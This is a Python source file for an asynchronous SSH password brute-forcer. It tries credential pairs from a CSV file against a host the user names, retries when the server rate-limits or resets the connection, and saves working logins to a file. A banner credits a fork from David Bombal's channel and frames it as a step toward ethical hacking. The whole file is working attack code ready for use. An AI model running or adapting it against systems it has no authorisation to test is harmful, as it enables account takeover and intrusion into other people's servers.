import csv
import ipaddress
import asyncssh
import asyncio
import time
import sys

FOUND = False

async def ssh_connect(HOST, PORT, username, password, FLAG):
    global FOUND
    try:
        async with asyncssh.connect(HOST, port=PORT, username=username, password=password):
            print(f"(!!!) Username - {username} and Password - {password} found.")
            FOUND = True
            # Save found credentials
            with open("credentials_found.txt", "a") as file:
                file.write(f"Username: {username}\nPassword: {password}\nWorked on host {HOST}\n")

    except asyncssh.misc.PermissionDenied:
        if FLAG == 'true':
            print(f"Username - {username} and Password - {password} is Incorrect.")
    except asyncssh.misc.ConnectionLost:
        print("**** Attempting to connect - Rate limiting on server ****")
        await ssh_connect(HOST, PORT, username, password, FLAG)
    except ConnectionResetError:
        print('**** Attempting to connect = Server\'s reset connection ****')
        await ssh_connect(HOST, PORT, username, password, FLAG)
            

# This function gets a valid IP address from the user.  =============================
def get_ip_address():
    while True:
        host = input("Please enter the host ip address: ")
        try:
            # Check if host is a valid IPv4 address. If so we return host.
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            print("Please enter a valid ip address.")

# This function gets a valid SSH port from the user.  ===============================
def get_port():
    while True:
        port = input("Please enter the SSH port: ")
        try:
            # Check if SSH port is a valid one. If so we return port.
            port = int(port)
            return port
        except Exception:
            print("Please enter a valid port.")

# This function gets a valid delay from the user.  =================================
def get_delay():
    while True:
        delay = input("Please enter delay between connections (sec): ")
        try:
            # Check if delay is valied. If so we return delay.
            delay = float(delay)
            return delay
        except Exception:
            print("Please enter a valid delay.")
    
# Main loop =========================================================================
async def __main__():

    banner = """                             
    _____ _____ _   _                                                             
    /  ___/  ___| | | |                                                            
    \ `--.\ `--.| |_| |   forked from David Bombal => Check his YT channel                                                         
     `--. \`--. \  _  |   by wannebetheshy                                                         
    /\__/ /\__/ / | | |   v 1.0                                                         
    \____/\____/\_| |_/        path to ethical hacker?                                                    
      ___                        ______            _        ______                 
     / _ \                       | ___ \          | |       |  ___|                
    / /_\ \___ _   _ _ __   ___  | |_/ /_ __ _   _| |_ ___  | |_ ___  _ __ ___ ___ 
    |  _  / __| | | | '_ \ / __| | ___ \ '__| | | | __/ _ \ |  _/ _ \| '__/ __/ _ \\
    | | | \__ \ |_| | | | | (__  | |_/ / |  | |_| | ||  __/ | || (_) | | | (_|  __/
    \_| |_/___/\__, |_| |_|\___| \____/|_|   \__,_|\__\___| \_| \___/|_|  \___\___|
                __/ |                                                              
               |___/                                                               
                                        
    """
    
    # just decoration stuff :)
    for line in banner.split('\n'):
        print(line)
        time.sleep(0.05)

    coroutines_list = []
    
    HOST = get_ip_address()
    PORT = get_port()
    LIST_FILE= input('Path to *.csv file to read credentials from: ')
    DELAY = get_delay()
    FLAG = input('Show incorrect result? (True/False = false default): ').lower()

    print('Opening credentials file...')
    with open(LIST_FILE) as fh:
        csv_reader = csv.reader(fh, delimiter=",")

        print('Generating asynchronous tasks...')
        for index, row in enumerate(csv_reader):
            
            # The 0 index is where the headings are allocated.
            if index == 0:
                continue
            
            # Skip empty rows
            if row == []:
                continue
        
            # adding i/o tasks for asynchronous executing
            coroutines_list.append(asyncio.create_task(ssh_connect(HOST, PORT, row[0], row[1], FLAG)))
        
            # we leave a small time between starting a new connection because of server reset error.
            await asyncio.sleep(delay=DELAY)

        print('Waiting for remaining answers...')        
        await asyncio.gather(*coroutines_list)
        if FOUND:
            print('File "credentials_found.txt" was successfully written!')
        else:
            print('Can\'t found something interesting :C')

# We check if program doesn't start from elsewhere
if __name__ == '__main__':
    asyncio.run(__main__())
